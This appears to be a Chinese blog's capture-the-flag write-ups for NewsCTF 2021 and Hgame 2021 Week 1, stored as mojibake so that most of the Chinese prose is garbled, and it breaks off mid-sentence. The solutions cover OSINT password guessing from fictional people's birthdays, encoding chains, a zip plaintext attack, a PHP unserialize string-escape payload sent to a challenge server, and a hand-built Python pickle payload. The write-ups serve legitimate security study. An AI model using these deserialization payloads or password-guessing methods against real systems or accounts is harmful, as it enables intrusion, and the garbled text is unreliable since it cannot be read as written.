///å‹¿åœ¨è¯„è®ºåŒºæ³„éœ²æˆ–æä¾›è§£é¢˜æ€è·¯ï¼Œå¦åˆ™å°†å…³é—­è¯„è®ºåŠŸèƒ½ã€‚é¢˜ç›®ä¸­æ¶‰åŠåˆ°çš„äººåï¼Œç”Ÿæ—¥å‡ä¸ºè™šæ„ï¼Œæ¶‰åŠåˆ°çš„åœ°åï¼Œå…¬å¸ç­‰å‡æ˜¯éšæœºæŒ‘é€‰çš„ï¼Œè¯·å‹¿å¯¹é¢˜ç›®ä¸­å‡ºç°çš„æ‰‹æœºå·è¿›è¡Œéªšæ‰°ï¼Œå‡ºé¢˜äººæ¦‚ä¸æ‰¿æ‹…è´£ä»»/// æ„Ÿè°¢èŠ‚å¥å¤§å¸ˆå¸¦æˆ‘å…¥å‘éŸ³æ¸¸ï¼Œè™½ç„¶å‡ å¹´æ²¡ç©äº†ä½†æ˜¯ç°åœ¨ä¾æ—§å›å½’å•¦ï¼å±è‚¡è‚‰ï¼ˆphigrosï¼‰ä¼šè®°ä½ä½ çš„è¿˜æœ‰bang dream ç©åˆ°äº†é‚£ä¹ˆä¹…ï¼Œç´¯æ­»äº†ã€‚ä»Šå¤©è¿˜å­¦åˆ°ä¸ªä¸œè¥¿â €â¡˜â €â¡™â €â¡â €â¡„â£¿â ªâ¡›â£¶â¡¸â ±â €â â¡¥â£†â¡—â €â¡â¢Š== ç›²æ–‡è§£å¯† hintï¼šå¯†ç =æ—¶åœ°äºº ä»Šå¤©å“¥å“¥ç»™äº†ä¸ªæ——å¸œå«æˆ‘ä¿ç®¡å¥½é‚£æˆ‘è¿˜æ˜¯æ”¾åˆ«çš„åœ°æ–¹å§æ€•å¿˜äº†è¿˜æ˜¯å­˜ä¸€ä¸‹ç›¸å†Œ å“‡å“ˆå“ˆå“ˆå“ˆä½³ä½³ä»Šå¤©è¿ç€5ä¸ªè¿æ°”ç‹æœç„¶æˆ‘åˆ˜æŸäººåä¸è™šä¼  ==&gt; åˆ˜ä½³ä½³ 1æœˆ14æ—¥ 22:05 ä»Šå¤©ç»ˆäºæ”¾å‡å•¦ï¼åƒç«é”…æ•²å¼€å¿ƒçš„ï¼ 2020å¹´12æœˆ31æ—¥ 00:00 é©¬ä¸Šæ”¾å‡å•¦ï¼ï¼ï¼ï¼ï¼ï¼æ™šä¸Šçœ‹ç”µå½±è¦æ³¨æ„ç»†èŠ‚~ 2020å¹´12æœˆ25æ—¥ 22:22 ä¸‰ä¸ªèŠ‚æ—¥è¿ç€è¿‡ å¥½å¿«è½ æ˜å¤©å°±ç¬¬äºŒä¸ªåå¹´å•¦ 2020å¹´12æœˆ22æ—¥ 23:33 ä»Šå¤©å­¦æ ¡çš„äº‹ä¹Ÿå¥½å¤š-n-å¸Œæœ›è¿‡å‡ å¤©å¯ä»¥åƒé¡¿å¥½çš„(*â‰§â–½â‰¦)ï¾‰ï½¼)) å››å·ç»µé˜³ ç»“åˆè¯„è®º ==&gt; birthday: 20001226 é¡ºä¾¿ï¼Œä¸€ç›´æœ‰ 2931479782 è¿™ä¸ªQQç‚¹èµå’Œè¯„è®ºã€‚ä»–æœ‰æ¡è¯´è¯´ hint:å¼±å£ä»¤ åœ°åŒºå­—æ¯ï¼Œåå­—å­—æ¯(Â¯ã…¿Â¯;)ç”Ÿæ—¥ ä¸åŒå½¢å¼éƒ½è¯•è¯• ç›¸å†Œï¼š sU*f4#OY/6+ghE ä¸æ‡‚ å†å›åˆ°å¦¹å¦¹çš„ç›¸å†Œï¼Œç¬¬ä¸‰ä¸ªç›¸å†Œï¼Œæ ¹æ®æç¤º 2+3+8 å¯†ç ä¸º lsljj20001226 å¾—åˆ°ä¸€å¼ äºŒç»´ç ã€‚ æ‰«ç å¾—åˆ° My MicroBlog nameï¼šå•Šè¿™ovo001 å»å¾®åšæ‰¾æ‰¾ã€‚ æœ‰ Nano å”‰ï¼ˆx 2598888 ä¹å±± =&gt; å°šçº¬è‚¡ä»½ è§£å¾—å¦¹å¦¹çš„ç¬¬ä¸€ä¸ªç›¸å†Œå¯†ç ï¼ˆå“¥å“¥çš„å…¬å¸ï¼‰ å¾—åˆ°ä¸¤å¼ å›¾ a2492853776@163.com é‚£çœ‹ç¬¬ä¸€å¼ å›¾å¥½äº†ã€‚ å‘ç°åŸå›¾ç»“å°¾éšå†™äº†ä¸ª zip ä»¥ä¸‹æ˜¯é¢˜ç›®æè¿°ï¼š å™¢ï¼Œæˆ‘çš„è€å…„ï¼Œå¾ˆæŠ±æ­‰çœ‹äº†ä½ çš„ç…§ç‰‡ï¼Œè¿™æ„Ÿè§‰çœŸæ˜¯å¤ªç³Ÿäº†ã€‚æˆ‘æ˜¯è¯´ï¼Œè™½ç„¶éš”äº†è¿™ä¹ˆä¹…ï¼Œæˆ‘è¿˜æ˜¯å¿ä¸ä½æƒ³ç”¨æ²‰é»˜ä¹‹çœ¼æ¥å¯»æŸ¥è¿™ä¹‹ä¸­çš„ç§˜å¯†ã€‚æˆ‘æƒ³ä½ å¯èƒ½å¯¹æˆ‘ä»¬çš„é´å­æœ‹å‹æˆ–è€…å±è‚¡è€å¼Ÿæœ‰ä»€ä¹ˆåè§ï¼Œå°±åƒæˆ‘ä»¬éƒ½ä»¥ä¸ºçº¦ç¿°å°¼å…ˆç”Ÿæ€»æ‰“ä»–çš„ç‹—ï¼Œä½†æ˜¯äº‹å®ä¸æ˜¯é‚£æ ·çš„ï¼Œä»–ä»¬å°±åƒå…„å¼Ÿä¸€æ ·ï¼Œæˆ‘äº²çœ¼æ‰€è§ï¼Œæˆ‘å‘èª“ã€‚ ------------------------------------------------ é¢˜ç›®1ï¼šï¼ˆé¢˜ç›®1å’Œé¢˜ç›®2éƒ½å¯ä»¥å¾—åˆ°flagç›¸å†Œå¯†ç ï¼Œè‡ªç”±æŠ‰æ‹©é€‰æ‹©å“ªæ¡ï¼‰ æ‰¾åˆ°å¯†ç ï¼Œå°†å¯†ç å‘é€ç»™æŒ‡å®šçš„é‚®ç®±ï¼Œå³å¯è·å¾—flagï¼Œå¿«æ¥æŒ‘æˆ˜å§ï¼ ï¼ˆå¯†ç å¿…é¡»å†™åœ¨ä¸»é¢˜ä¸Šè€Œä¸æ˜¯å†…å®¹ä¸Šï¼‰ æ˜Ÿæ˜Ÿçš„å¤œ.png éšå†™ å¦ä¸€å¼ å¸¦æœ‰é‚®ç®±çš„å›¾ä¹Ÿéšå†™æœ‰ zipã€‚ å€’æ•°ç¬¬2æ­¥.txt é¢˜ç›®2ï¼šï¼ˆé¢˜ç›®1å’Œé¢˜ç›®2éƒ½å¯ä»¥å¾—åˆ°flagç›¸å†Œå¯†ç ï¼Œè‡ªç”±æŠ‰æ‹©é€‰æ‹©å“ªæ¡ï¼‰ æœ¬æ¬¡é¢˜ç›®è€ƒéªŒæ”¶é›†èƒ½åŠ› ä¹Ÿè¦è€ƒæŸ¥æœç´¢èƒ½åŠ› ä¸€èµ·æ¥å¿«ä¹çš„å›ç­”é—®é¢˜å§ï¼ ï¼ˆå°†æ‰€æœ‰ç­”æ¡ˆçš„é¦–å­—æ¯å¤§å†™è¿åœ¨ä¸€èµ·å³æ˜¯ç­”æ¡ˆï¼‰è¯·æ³¨æ„æ˜¯å¤§å†™å¤§å†™å¤§å†™å¤§å†™å¤§å†™å¤§å†™å¤§å†™å¤§å†™ ç­”æ¡ˆéƒ½æ˜¯è‹±æ–‡å­—æ¯ ä¾‹å¦‚é¢˜ç›®æè¿°ï¼šçŒç¡ä¹”æ˜¯æŒ‡----ç­”ï¼šJoseph Robinette Biden, Jrï¼ˆJoe Bidenï¼‰ã€‚é¦–å­—æ¯æ˜¯J 1.æ‰“5æŠŠcsgoå‡ºè‡ª 2.ç°ä»»ç¾å›½ä¸­å¤®æƒ…æŠ¥å±€å±€é•¿æ˜¯ï¼ˆå‡ºé¢˜æ—¶é—´2021å¹´2æœˆ1æ—¥ï¼‰ 3.â€œæ˜¯ç”·äººå°±ä¸‹ä¸€ç™¾å±‚â€è¢«ä¸€ä½UPä¸»æ‰¾åˆ°æ­£ç¡®çš„ç‰ˆæœ¬å¹¶ä¸”æ›´æ­£äº†ç™¾åº¦è¯æ¡ä¸Šçš„é”™è¯¯ä¿¡æ¯ï¼Œè¯·é—®ä»–æ›´æ­£çš„è¯æ¡çš„ç‰ˆæœ¬å“ˆå¸Œå€¼æ˜¯å¤šå°‘ï¼Ÿ 4.IAUåœ¨1928å›½é™…å¤©æ–‡ä¼šè®®ä¸­è®¤å®šçš„æ–°çš„æ˜Ÿåº§çš„æ‹‰ä¸å­¦åæ˜¯ï¼Ÿ 5.https://www.bilibili.com/ç½‘ç«™ipåœ°å€ä¸º110/120.xx.xx.xxçš„è¿è¥å•†çš„å®˜ç½‘æ˜¯ï¼Ÿ Gï¼ˆã€ŠGoyang Ubur Uburã€‹ï¼Œå°å°¼å®½å¸¦å¹¿å‘Šçš„èƒŒæ™¯éŸ³ä¹çš„æ­Œè¯ç©ºè€³ï¼Œæ­Œè¯åŸæ–‡åº”ä¸º Takupaz Dance Crewï¼Œå¡”åº“å¸•å…¹èˆè¹ˆé˜Ÿ Wï¼ˆWilliam Joseph Burnsï¼Œï¼ˆé—®äº†å‡ºé¢˜äººè¯´æ˜¯è¿™ä¸ªã€‚ã€‚ï¼‰è¯¦è§ Director of the Central Intelligence Agency David S. Cohenï¼Œ20210120 å®£èª“å°±èŒï¼Œæ³¨æ„åˆ°å¾ˆå¤šåœ°æ–¹ç”šè‡³ä¸­æ–‡ç»´åŸºç™¾ç§‘éƒ½æ²¡æ›´æ–°ï¼Œè¯¦æƒ… https://www.cia.gov/about/ Fï¼ˆf2549bf9e2c93acbb794041185c26fc0. è€ƒè™‘åˆ°2.1ä¹‹å‰ï¼Œä¸”ç­”æ¡ˆéƒ½æ˜¯è‹±æ–‡å­—æ¯ï¼Œæ˜¯ UP ä¸» ï¼ˆå“ˆå¸Œå€¼å°± A-F å˜› Oï¼ˆOphiuchusï¼Œè›‡å¤«åº§ Kï¼ˆé‡‘å±±äº‘ï¼Œwww.ksyun.comï¼Œç”¨ ping å·¥å…·çœ‹äº†çœ‹ï¼Œå°ç ´ç«™çš„æœåŠ¡å•†çœŸå¤š GWFOK ç„¶åå‘é‚®ä»¶ç»™é‚£ä¸ªé‚®ç®±ã€‚ è¿™é‡Œæˆ‘è¿˜ä»¥ä¸ºç›´æ¥å°±æ˜¯ç›¸å†Œå¯†ç äº†å‘¢ï¼Œå»çˆ†ç ´äº†ç©ºé—´ç›¸å†Œï¼ˆx ç„¶åéªŒè¯ç ç¡®è®¤ç‚¹ä¸åŠ¨ï¼Œäºæ˜¯çœ‹äº†çœ‹QQç©ºé—´ç›¸å†Œçš„ä»£ç ï¼Œå¥½ä¸‘å•Šã€‚ æ­å–œä½ ï¼è¿™æ˜¯ç›¸å†Œâ€œæ——å¸œâ€çš„å¯†ç ï¼ˆåªå¥—äº†ç®€å•çš„4å±‚ï¼‰ï¼š 23khUrNeAf1igP4PixgoUUDQLaRGGfEpPsFEd9CCKaUWfwYmG4ZmCwFVEkNNwtijxVcn6a6XkwC1ctqMLAax4aGK åˆæ˜¯ base å…¨å®¶æ¡¶ å¾—åˆ°ç›¸å†Œå¯†ç  youfindme! æ‹¿åˆ° flag flag{th1s_1s_A_Fla9_aNd_n0bod9_C3n_f1nd_1t} Cryptoè´æ–¯å®¶æ—;gM&amp;7AOTKl:236b;HHIm='%8*=''2q;FX]*&lt;,5Z\\&gt;'a(\\&lt;*)(o:2&lt;mE;DL+19egH[A2@7[A28+B;L2)3;-,Jc&lt;EDpe@kpeS=]Ipp@5)e@;FN&lt;1@VeM3=tj,I=u'8;;FXDT@;BL0@o[bo=]\\dGA2?f'&lt;CL(F@k`.CASl6l:236V@Vo.c&gt;&amp;6JY@mipjA4Tls;/:D4=]I2%@PTof&lt;*)gK;eo9(@VeIr base85 SzJSeERNNjFBRWJXWW5zWWl5RFVoTkZvZzRiTW9iNkViR25VM1lOd3VLd2poRzNLQW1hUWNIc2NNYUFZa0tnRE1GblFRZ0ZCZ2Z3RFNLakg0cUxrYWZpd3IzUEZ0c0xkemlaNjF6bmVqZlA0cDJWdHZKQkx3YU1yb28xTWN0SkRKblE= base64 K2RxDM61AEbWYnsYiyDUhNFog4bMob6EbGnU3YNwuKwjhG3KAmaQcHscMaAYkKgDMFnQQgFBgfwDSKjH4qLkafiwr3PFtsLdziZ61znejfP4p2VtvJBLwaMroo1MctJDJnQ base32 ä»…é™ç¬¬ä¸€å¤©ï¼Œæ”¯ä»˜å®å£ä»¤[å¤§å‰å¤§åˆ©èŒæ–°åƒé¸¡] Base å®¶æ—ï¼š ä¸»è¦æœ‰ 100, 94, 92, 91, 85, 64, 62, 58, 56, 52, 36, 32, 16 å¤§æ¦‚è¿™äº›å§ã€‚ éƒ¨åˆ† alphabetï¼š BASE16 = 0123456789ABCDEF BASE32 = ABCDEFGHIJKLMNOPQRSTUVWXYZ234567 BASE36 = 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ BASE52 = 0123456789BCDFGHJKLMNPQRSTVWXYZbcdfghjklmnpqrstvwxyz BASE56 = 23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz BASE58 = 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz BASE62 = 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz BASE64 = ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ BASE85 = 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&amp;()*+-;&lt;=&gt;?@^_`{|}~ BASE91 = ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}~\" BASE94 = !\"#$%&amp;\\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ Python3 base85 ä¸­åˆ†ä¸º base64.a85encode å’Œ base64.b85encodeï¼Œaæ˜¯ Ascii85ï¼Œbæ˜¯ IPv6ï¼ˆRFC1924ï¼‰ã€‚ ASCII85 encoding. This is the default. 0x00000000 is compressed to z. Spaces are not compressed. Adobe ASCII85 encoding is same as previous except data is enclosed between &lt;~ and ~&gt; . ZeroMQ (Z85) encoding. NOTE! Even though specification says input length must be divisible by 4, this is not currently enforced. Spaces and zeroes are not compressed. Character set from RFC1924 which is an April fools joke. Spaces and zeroes are not compressed. å¥½æ—¥å­ å¥½æ—¥å­ï¼Œ11æœˆ11æ—¥ â†—â†—â†â†–â†•â†–â†•â†³â†—â†°â†—â†ºâ†–â†’â†”â†°â†•â†™â†•â†ºâ†”â†°â†–â†—â†”â†–â†”â†‘â†”â†’â†â†‘â†–â†“â†—â†“â†â†”â†”â†—â†â†˜â†•â†–â†â†•â†•â†»â†—â†°â†•â†“â†–â†â†—â†²â†—â†‘â†—â†±â†—â†˜â†•â†”â†•â†»â†â†“â†”â†˜â†—â†•â†•â†”â†–â†‘â†–â†–â†—â†”â†—â†²â†”â†™â†—â†—â†—â†—â†”â†”â†•â†°â†”â†”â†•â†°â†–â†°â†”â†”â†—â†’â†•â†”â†—â†•â†–â†’â†•â†–â†•â†“â†–â†â†—â†°â†”â†‘â†—â†–â†•â†»â†â†•â†•â†•â†â†–â†—â†˜â†”â†”â†•â†”â†–â†’â†”â†°â†â†”â†–â†–â†–â†˜â†•â†±â†â†‘â†”â†°â†”â†—â†•â†˜â†•â†ºâ†â†’â†—â†–â†—â†²â†â†™= ç®­å¤´åŠ å¯† G6fmJNRzinzWvqr1SC4w8f5oJcPLAKHdo3xEdQVDLyGGtjtjZtBdERfcPJqFo5e6HtdRz4VXk1zwhn2FL9 base58 U2FsdGVkX19oI1ocbbcM5wensOuKarNA3noE/HS74RNYqh0stoMpQohkLGqF å† base64 å¯ä»¥å‘ç°å¼€å¤´æ˜¯ Salted__ï¼ŒåŠ ç›åŠ å¯†äº†ã€‚ Rabbit è§£å¯† klv,oclz{mkd_slp_vb_zjjs_slp} æ‡’äº†ï¼Œç›´æ¥å» quipquip è·‘äº†ã€‚ flag{the_day_is_good_day} Webgirlfriendç­¾åˆ°é¢˜ &lt;?php include ('flag.php'); error_reporting(0); function filter($payload){ $key = array('php','flag','boyfriend'); $filter = '/'.implode('|',$key).'/i'; return preg_replace($filter,'hack!!!!',$payload); } $payload=$_GET['payload']; $GDUT['A&amp;D']='666'; $GDUT['Hed9eh0g']='no_girlfriend'; if(isset($payload)) { if (strpos($payload, 'php')===false &amp;&amp; strpos($payload, 'flag')===false &amp;&amp; strpos($payload, 'boyfriend')===false) { echo 'fuck_no_key!!!'; }else{ $GDUT['A&amp;D']=$payload; $GDUT=unserialize(filter(serialize($GDUT))); if ($GDUT['Hed9eh0g'] === 'has_girlfriend') { echo $flag; } else { echo 'fuck_no_girlfriend!!!'; } } }else{ highlight_file(__FILE__); } PHP ååºåˆ—åŒ–æ¼æ´ å…ˆæœ¬åœ°è¯•äº†è¯•ï¼Œpayload ä¸º flagmiaotony å¾—åˆ°çš„åºåˆ—åŒ–å¯¹è±¡ \";s:8:\"Hed9eh0g\";s:14:\"has_girlfriend\";} é•¿åº¦ä¸º40ï¼Œç”¨ 10ä¸ª flag æ»¤æ‰å°±å¥½äº†ã€‚ Payload: flagflagflagflagflagflagflagflagflagflag\";s:8:\"Hed9eh0g\";s:14:\"has_girlfriend\";} http://47.106.172.29:2333/?payload=flagflagflagflagflagflagflagflagflagflag%22;s:8:%22Hed9eh0g%22;s:14:%22has_girlfriend%22;} newsctf{i_Lov3_nEws4tF_wEb} beautifulgirlfriendhttp://47.106.172.29:8081 è®¿é—® /source å¾—åˆ°æºç  import base64 import pickle from flask import Flask, Response, request, render_template import Hed9eh0g_girlfriend app = Flask(__name__) class girl: def __init__(self, name, age): self.name = name self.age = age @app.route('/', methods=[\"GET\"]) def hello(): return render_template('index.html') @app.route('/guess', methods=['GET']) def index(): if request.method == 'GET': try: pickle_data = request.args.get('payload') print(pickle_data) she = pickle.loads(base64.b64decode(pickle_data)) if she.name == Hed9eh0g_girlfriend.name and she.age == Hed9eh0g_girlfriend.age: return Hed9eh0g_girlfriend.flag except Exception as e: print(repr(e)) return \"Something wrong\" def read(filename, encoding='utf-8'): with open(filename, 'r', encoding=encoding) as fin: return fin.read() @app.route('/source', methods=['GET']) def show_source(): return Response(read(__file__), mimetype='text/plain') if __name__ == '__main__': app.run(host='0.0.0.0', port=8081) åˆæ˜¯ pickle ååºåˆ—åŒ–å•¦ã€‚ å‚è€ƒ XCTFé«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ› WriteUpâ€”â€”webtmp ä¸€é¢˜ è¿™é¢˜éœ€è¦ååºåˆ—åŒ–ä¹‹åçš„ name å’Œ age ä¸å¼•å…¥çš„ç›¸åŒï¼Œä½†ä¸èƒ½æŠŠ Hed9eh0g_girlfriend.flag ç»™è¦†ç›–æ‰ï¼Œæ‰€ä»¥ä¸èƒ½é‡‡ç”¨ è‡ªå·±é€ ä¸€ä¸ª Hed9eh0g_girlfriend çš„æ€è·¯ã€‚ è€Œæ˜¯åº”è¯¥åœ¨æ„é€  girl å¯¹è±¡å®ä¾‹åŒ–çš„æ—¶å€™å¼•å…¥ Hed9eh0g_girlfriend.name å’Œ Hed9eh0g_girlfriend.ageã€‚ åˆæ˜¯æ‰‹æ“ pickle äº†ï¼ s = b'\\x80\\x03c__main__\\ngirl\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03cHed9eh0g_girlfriend\\nname\\nq\\x04X\\x03\\x00\\x00\\x00ageq\\x05cHed9eh0g_girlfriend\\nage\\nq\\x06ub.' pickletools.dis(s) base64.b64encode(s) # gANjX19tYWluX18KZ2lybApxACmBcQF9cQIoWAQAAABuYW1lcQNjSGVkOWVoMGdfZ2lybGZyaWVuZApuYW1lCnEEWAMAAABhZ2VxBWNIZWQ5ZWgwZ19naXJsZnJpZW5kCmFnZQpxBnViLg== dis çœ‹ä¸€ä¸‹ 0: \\x80 PROTO 3 2: c GLOBAL '__main__ girl' 17: q BINPUT 0 19: ) EMPTY_TUPLE 20: \\x81 NEWOBJ 21: q BINPUT 1 23: } EMPTY_DICT 24: q BINPUT 2 26: ( MARK 27: X BINUNICODE 'name' 36: q BINPUT 3 38: c GLOBAL 'Hed9eh0g_girlfriend name' 64: q BINPUT 4 66: X BINUNICODE 'age' 74: q BINPUT 5 76: c GLOBAL 'Hed9eh0g_girlfriend age' 101: q BINPUT 6 103: u SETITEMS (MARK at 26) 104: b BUILD 105: . STOP highest protocol among opcodes = 2 ç„¶å /guess?payload=xxxxx æ‰“è¿‡å»å°±å¥½äº†ã€‚ newsctf{girlfriend?nothing!!!Affect_sword_speed} å…¶å®è¿™é¢˜æ‰“æ³•åº”è¯¥æŒºå¤šçš„ï¼Œåå¼¹ shell åº”è¯¥ä¹Ÿè¡Œï¼Œä½†ä¸çŸ¥é“ä¸ºå•¥æ²¡æ‰“é€šï¼ˆï¼Ÿï¼‰ EZå¥—å¨ƒ bugku web41 é™„é“¾æ¥ï¼šhttps://ctf.bugku.com/challenges/detail/id/183.html &lt;?php // phpç‰ˆæœ¬:5.4.44 header(\"Content-type: text/html; charset=utf-8\"); highlight_file(__FILE__); class evil{ public $hint; public function __construct($hint){ $this-&gt;hint = $hint; } public function __destruct(){ if($this-&gt;hint===\"hint.php\") @$this-&gt;hint = base64_encode(file_get_contents($this-&gt;hint)); var_dump($this-&gt;hint); } function __wakeup() { if ($this-&gt;hint != \"â•­(â—ï½€âˆ€Â´â—)â•¯\") { //There's a hint in ./hint.php $this-&gt;hint = \"â•°(â—â€™â—¡â€™â—)â•®\"; } } } class User { public $username; public $password; public function __construct($username, $password){ $this-&gt;username = $username; $this-&gt;password = $password; } } function write($data){ global $tmp; $data = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $data); $tmp = $data; } function read(){ global $tmp; $data = $tmp; $r = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $data); return $r; } $tmp = \"test\"; $username = $_POST['username']; $password = $_POST['password']; $a = serialize(new User($username, $password)); if(preg_match('/flag/is',$a)) die(\"NoNoNo!\"); unserialize(read(write($a))); æ€ä¹ˆåˆæ˜¯ååºåˆ—åŒ–â€¦â€¦ ï¼ˆå¾…ç»­ å°ç»“ Misc AK äº†ï¼ å¥½å®¶ä¼™ï¼Œå¿«æ‰“ FW_Mumuzi å¸ˆå‚…ï¼Œå‡ºé¢˜è€å¥—å¨ƒäº†ï¼ Web æ€ä¹ˆå…¨æ˜¯ååºåˆ—åŒ–ï¼Œæœ‰æ¯’ BTWï¼Œè¿™ä¸ª OSINT é¢˜ç¡®å®æŒºå¥½ç©ï¼ˆ æœ¬æ–‡æœ‰å…³å†…å®¹ä»…ä¾›å­¦ä¹ ç ”ç©¶ï¼Œè¯·åœ¨åˆç†åˆæ³•èŒƒå›´å†…ä½¿ç”¨ï¼ ç‰›å¹´å°±è¦æ¥äº†å‘€ï¼ é™¤å¤•å¿«ä¹ï¼Œæ–°å¹´å¿«ä¹å–µ~ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/02/11/CTF_2021NewsCTF/"},{"title":"CTF | 2021 Hgame Week1 WriteUp","text":"å¼•è¨€ä¸€å¹´ä¸€åº¦ï¼Œç”±æ­å·ç”µå­ç§‘æŠ€å¤§å­¦ Vidar Team ä¸¾åŠçš„ Hgame åˆæ¥äº†ï¼ ä»Šå¹´å’Œå¾€å¹´ä¸€æ ·ï¼ŒæŒç»­å››å‘¨ï¼Œæ˜¯æ‹›æ–°èµ›ï¼Œä¸è¿‡æ„Ÿè§‰ä»Šå¹´äººæ›´å¤šäº†ã€‚ é¢˜ç›®å€’æŒºæœ‰è¶£å‘³ä¹Ÿæœ‰æ¢¯åº¦çš„ï¼Œæ­£å¥½å°±æ¥çœ‹çœ‹äº†ã€‚ è¿™ç¯‡å°±æ˜¯ç¬¬ä¸€å‘¨çš„ WriteUp å•¦ã€‚ å…¶å®å»å¹´ä¹Ÿæ¥äº†ï¼Œä½†è²Œä¼¼çœ‹äº†ç¬¬ä¸€å‘¨åé¢å°±æ²¡æ€ä¹ˆçœ‹ï¼Œæˆ–è€…æ²¡å†™ WriteUpäº† æƒ³å›é¡¾å¯ä»¥ç§»æ­¥ CTF | Hgame2020 Week1 WriteUp. ï¼ˆè¯´å¥½çš„ æœªå®Œå¾…ç»­ï¼Œæœç„¶å’•æ‰äº†ã€‚ åé¢å‡ å‘¨å¯èƒ½ä¹Ÿä¸ä¸€å®šæœ‰ç©ºæ¥çœ‹é¢˜äº†ï¼Œä¸çŸ¥é“èƒ½åšæŒå‡ å‘¨äº† 233 å¹³å°ï¼š https://hgame.vidar.club/ MiscBaseå…¨å®¶ç¦ æ–°å¹´å³å°†æ¥ä¸´ä¹‹é™…ï¼ŒBaseå®¶æ—ä¹Ÿå›¢èšäº†ï¼Œä»–ä»¬ç”¨ä»–ä»¬ç‰¹æœ‰çš„æ‰“æ‹›å‘¼æ–¹å¼å‘ä½ é—®äº†ä¸ªå¥½ï¼Œä½ çŸ¥é“ä»–ä»¬åœ¨è¯´ä»€ä¹ˆå—ï¼Ÿ R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09 è€å¥—è·¯äº†ã€‚ Base64 =&gt; Base32 =&gt; Base16/Hex hgame{We1c0me_t0_HG4M3_2021} ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³• 0x4qEç»™äº†å¼ å›¾ç»™æˆ‘ï¼Œè¯´è¿™å›¾æš—è—ç„æœºï¼Œä½ èƒ½å¸®æˆ‘æ‰¾å‡ºæ¥å—ï¼Ÿ æå–æ‹¼æ¥çš„å‹ç¼©åŒ…ï¼Œå¤‡æ³¨æç¤º Password is picture ID (Up to 8 digits) ç›²çŒœæ˜¯ Pç«™æŸå¼ å›¾ç‰‡çš„IDï¼Œä¸è¿‡è¿™é‡Œæ‡’äº†ï¼Œç›´æ¥çˆ†ç ´å¥½äº†ã€‚ å¾—åˆ°å¯†ç ä¸º 70415155 è§£å‹å¾—åˆ° NO PASSWORD.txt Sometimes we don't need to care about password. Because it's too strong or null. XD By the way, I only use storage. ä»¥åŠä¸€ä¸ª plain.zip æ˜æ–‡æ”»å‡»å•¦ã€‚ æ³¨æ„è¦å…ˆæŠŠ NO PASSWORD.txt æ‰“åŒ…æˆå‹ç¼©åŒ…ï¼Œä½†æ˜¯ä¸å‹ç¼©ã€‚ C8uvP$DP å¾—åˆ° flag.zipï¼Œä¼ªåŠ å¯†ã€‚ å…¶å®ä¸æ”¹ä¹Ÿè¡Œï¼Œæ²¡åŠ å¯†çš„æƒ…å†µä¸‹æ–‡ä»¶ååé¢è¿™æ®µå°±æ˜¯æ˜æ–‡çš„ã€‚ &amp;#x68;&amp;#x67;&amp;#x61;&amp;#x6D;&amp;#x65;&amp;#x7B;&amp;#x32;&amp;#x49;&amp;#x50;&amp;#x5F;&amp;#x69;&amp;#x73;&amp;#x5F;&amp;#x55;&amp;#x73;&amp;#x65;&amp;#x66;&amp;#x75;&amp;#x31;&amp;#x5F;&amp;#x61;&amp;#x6E;&amp;#x64;&amp;#x5F;&amp;#x4D;&amp;#x65;&amp;#x39;&amp;#x75;&amp;#x6D;&amp;#x69;&amp;#x5F;&amp;#x69;&amp;#x35;&amp;#x5F;&amp;#x57;&amp;#x30;&amp;#x72;&amp;#x31;&amp;#x64;&amp;#x7D; HTML å®ä½“ hgame{2IP_is_Usefu1_and_Me9umi_i5_W0r1d} Galaxyä¸‹è½½ä¸‹æ¥æµé‡åŒ…ï¼Œæå–ä¸‹å¾—åˆ°ä¸€å¼ å›¾ã€‚ ï¼ˆå™¢ï¼Œå‡ºé¢˜äººåœ¨ç™¾åº¦æœå›¾å•Š æ²¡çœ‹åˆ°æœ‰æ‹¼æ¥éšå†™ï¼Œä½†æ˜¯ç»å…¸å¥—è·¯ï¼Œæ”¹é«˜åº¦å°±å¥½äº†ã€‚ hgame{Wh4t_A_W0nderfu1_Wa11paper} Word RE:MASTERè‰ï¼Œè¿™å¼ å›¾æœ‰æ¯’â€¦â€¦ first.docx è—äº†ä¸€ä¸ª password.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt; &lt;password&gt;+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;-.++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.+ .++++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. +.--- --..+ .++++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;&lt;/password&gt; Brainfuck è·‘ä¸€è·‘ ï¼ˆè¿™ä¸ªå·¥å…· å¯è§†åŒ–æŒºå¥½çš„ DOYOUKNOWHIDDEN? æ‹¿å»å¼€ maimai.docx é‡Œé¢æœ‰å¼ å›¾ç‰‡ å™¢ä¸å¯¹ï¼Œä¸‹é¢è¿˜æœ‰éšè—æ–‡å­—ã€‚ è¿™é¦–æ­Œå« 